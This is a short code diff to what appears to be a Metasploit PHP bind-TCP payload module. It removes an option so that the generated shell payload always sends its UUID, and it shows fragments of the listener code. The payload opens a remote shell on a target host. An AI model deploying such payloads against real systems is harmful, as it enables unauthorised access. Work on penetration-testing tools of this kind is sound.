@@ -27,13 +27,7 @@ module Payload::Php::BindTcp
     Rex::Text.compress(php)
   end
 
-  #
-  # By default, we don't want to send the UUID, but we'll send
-  # for certain payloads if requested.
-  #
-  def include_send_uuid
-    false
-  end
+
 
   def use_ipv6
     false
@@ -81,7 +75,7 @@ if (is_callable('stream_socket_server')) {
 if (!$s) { die(); }
 ^
 
-    php << php_send_uuid if include_send_uuid
+    php << php_send_uuid
 
     php << %Q^switch ($s_type) {
 case 'stream': $len = fread($s, 4); break;
